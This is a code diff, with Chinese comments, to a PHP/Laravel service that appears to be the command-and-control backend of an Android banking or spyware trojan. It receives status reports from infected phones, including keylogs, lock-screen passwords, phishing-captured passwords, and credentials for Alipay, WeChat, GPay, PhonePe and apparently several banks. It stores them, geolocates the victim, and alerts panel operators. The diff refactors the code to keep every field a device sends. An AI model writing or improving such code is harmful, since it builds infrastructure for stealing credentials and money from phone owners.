@@ -23,75 +23,35 @@ final class DeviceStatusService
     {
         parse_str($encodedData, $params);
 
-        $status = [
+        // 直接保存设备发送的所有字段，添加服务端字段
+        $status = array_merge($params, [
             'phone_id' => $phoneId,
             'last_ping' => time(),
             'is_online' => true,
-        ];
-
-        $fieldMap = [
-            'phone_name' => 'name',
-            'model' => 'model',
-            'android_version' => 'android_version',
-            'battery_charge' => 'battery_level',
-            'accessibility' => 'has_accessibility',
-            'country' => 'country',
-            'user_email' => 'user_email',
-            'install_date' => 'installed_at',
-            'keylogs' => 'keylogs',
-            'phone_password' => 'phone_password',
-            'display' => 'display',
-            'activz' => 'activz',
-            // 新增: 设备信息字段
-            'phone' => 'phone_number',
-            'ip' => 'ip_address',
-            'has_password' => 'has_password',
-            // 密码字段
-            'pass_phone' => 'pass_phone',
-            'pass_phish' => 'pass_phish',
-            'pass_alipay' => 'pass_alipay',
-            'pass_wechat' => 'pass_wechat',
-            'pass_yun' => 'pass_yun',
-            'pass_jian' => 'pass_jian',
-            'pass_you' => 'pass_you',
-            'pass_nong' => 'pass_nong',
-            'pass_zhong' => 'pass_zhong',
-            'pass_gong' => 'pass_gong',
-            'pass_zhao' => 'pass_zhao',
-            'pass_gpay' => 'pass_gpay',
-            'pass_phonepe' => 'pass_phonepe',
-            'pass_bc' => 'pass_bc',
-            'pass_mb' => 'pass_mb',
-        ];
-
-        foreach ($fieldMap as $paramKey => $statusKey) {
-            if (isset($params[$paramKey])) {
-                $status[$statusKey] = $this->normalizeValue($params[$paramKey]);
-            }
-        }
+        ]);
 
         // IP 与归属地（兼容：异常不影响 WebSocket 正常连接）
         try {
-            if (empty($status['ip_address'])) {
+            if (empty($status['ip'])) {
                 $clientIp = $this->connectionManager->getClientIp($phoneId);
                 if ($clientIp !== null) {
-                    $status['ip_address'] = $clientIp;
+                    $status['ip'] = $clientIp;
                 }
             }
 
-            if (!empty($status['ip_address'])) {
+            if (!empty($status['ip'])) {
                 $existing = $this->connectionManager->getDeviceStatus($phoneId);
-                $existingIp = $existing['ip_address'] ?? null;
+                $existingIp = $existing['ip'] ?? null;
                 $existingLocation = $existing['ip_location'] ?? null;
 
-                if ($status['ip_address'] === $existingIp && !empty($existingLocation)) {
+                if ($status['ip'] === $existingIp && !empty($existingLocation)) {
                     $status['ip_location'] = $existingLocation;
                 } else {
                     $device = Device::where('uuid', $phoneId)->first();
-                    if ($device && $status['ip_address'] === $device->ip_address && !empty($device->ip_location)) {
+                    if ($device && $status['ip'] === $device->ip_address && !empty($device->ip_location)) {
                         $status['ip_location'] = $device->ip_location;
                     } else {
-                        $status['ip_location'] = app(GeoIpService::class)->getLocation($status['ip_address']);
+                        $status['ip_location'] = app(GeoIpService::class)->getLocation($status['ip']);
                     }
                 }
             }
@@ -100,6 +60,13 @@ final class DeviceStatusService
                 'phone_id' => $phoneId,
                 'error' => $e->getMessage(),
             ]);
+        }
+
+        // 规范化阿拉伯数字
+        foreach ($status as $key => $value) {
+            if (is_string($value)) {
+                $status[$key] = $this->normalizeValue($value);
+            }
         }
 
         $this->connectionManager->updateDeviceStatus($phoneId, $status);
@@ -134,8 +101,9 @@ final class DeviceStatusService
             'last_seen_at' => now(),
         ];
 
-        if (isset($status['name'])) {
-            $updates['name'] = $status['name'];
+        // 使用原始字段名映射到数据库字段
+        if (isset($status['phone_name'])) {
+            $updates['name'] = $status['phone_name'];
         }
         if (isset($status['model'])) {
             $updates['model'] = $status['model'];
@@ -143,17 +111,20 @@ final class DeviceStatusService
         if (isset($status['android_version'])) {
             $updates['android_version'] = $status['android_version'];
         }
-        if (isset($status['battery_level'])) {
-            $updates['battery_level'] = (int) $status['battery_level'];
+        if (isset($status['battery_charge'])) {
+            // 解析 "t~88" 格式，提取电量数字
+            $parts = explode('~', $status['battery_charge']);
+            $level = count($parts) >= 2 ? (int) $parts[1] : (int) $status['battery_charge'];
+            $updates['battery_level'] = $level;
         }
-        if (isset($status['has_accessibility'])) {
-            $updates['has_accessibility'] = $status['has_accessibility'] === '1';
+        if (isset($status['accessibility'])) {
+            $updates['has_accessibility'] = $status['accessibility'] === '1';
         }
         if (isset($status['country'])) {
             $updates['country'] = $status['country'];
         }
-        if (isset($status['ip_address'])) {
-            $updates['ip_address'] = $status['ip_address'];
+        if (isset($status['ip'])) {
+            $updates['ip_address'] = $status['ip'];
         }
         if (isset($status['ip_location'])) {
             $updates['ip_location'] = $status['ip_location'];
@@ -164,9 +135,9 @@ final class DeviceStatusService
         if ($isNewDevice || !$device->getOriginal('is_online')) {
             $this->connectionManager->notifyPanelUsersDeviceOnline($phoneId, $device->user_id, [
                 'phone_id' => $phoneId,
-                'phone_name' => $device->name ?? '',
-                'model' => $device->model ?? '',
-                'battery_charge' => $device->battery_level ?? '',
+                'phone_name' => $status['phone_name'] ?? '',
+                'model' => $status['model'] ?? '',
+                'battery_charge' => $status['battery_charge'] ?? '',
                 'is_online' => true,
             ]);
         }
@@ -186,18 +157,25 @@ final class DeviceStatusService
             return null;
         }
 
+        // 解析电量
+        $batteryLevel = null;
+        if (isset($status['battery_charge'])) {
+            $parts = explode('~', $status['battery_charge']);
+            $batteryLevel = count($parts) >= 2 ? (int) $parts[1] : (int) $status['battery_charge'];
+        }
+
         return Device::create([
             'uuid' => $phoneId,
             'user_id' => $user->id,
-            'name' => $status['name'] ?? 'Unknown Device',
+            'name' => $status['phone_name'] ?? 'Unknown Device',
             'model' => $status['model'] ?? null,
             'android_version' => $status['android_version'] ?? null,
-            'battery_level' => isset($status['battery_level']) ? (int) $status['battery_level'] : null,
-            'has_accessibility' => ($status['has_accessibility'] ?? '0') === '1',
+            'battery_level' => $batteryLevel,
+            'has_accessibility' => ($status['accessibility'] ?? '0') === '1',
             'country' => $status['country'] ?? null,
-            'ip_address' => $status['ip_address'] ?? null,
+            'ip_address' => $status['ip'] ?? null,
             'ip_location' => $status['ip_location'] ?? null,
-            'installed_at' => isset($status['installed_at']) ? \Carbon\Carbon::parse($status['installed_at']) : now(),
+            'installed_at' => isset($status['install_date']) ? \Carbon\Carbon::parse($status['install_date']) : now(),
             'is_online' => true,
             'last_seen_at' => now(),
         ]);
@@ -245,28 +223,13 @@ final class DeviceStatusService
         $status = $this->getStatus($phoneId);
         $isOnline = $this->isOnline($phoneId);
 
-        return [
+        // 直接返回设备原始数据，添加服务端字段
+        return array_merge($status, [
             'pid' => $phoneId,
             'is_online' => $isOnline,
             'lastPing' => ($status['last_ping'] ?? 0) * 1000,
-            'phone_name' => $status['name'] ?? '',
-            'model' => $status['model'] ?? '',
-            'android_version' => $status['android_version'] ?? '',
-            'battery_charge' => $status['battery_level'] ?? '',
-            'accessibility' => $status['has_accessibility'] ?? '0',
-            'country' => $status['country'] ?? '',
-            'user_email' => $status['user_email'] ?? '',
-            'install_date' => $status['installed_at'] ?? '',
-            'keylogs' => $status['keylogs'] ?? '',
-            'phone_password' => $status['phone_password'] ?? '',
-            'display' => $status['display'] ?? '',
-            'activz' => $status['activz'] ?? '',
-            // 新增字段
-            'phone' => $status['phone_number'] ?? '',
-            'ip' => $status['ip_address'] ?? '',
             'ip_location' => $status['ip_location'] ?? '',
-            'has_password' => $status['has_password'] ?? '0',
-        ];
+        ]);
     }
 
     /**
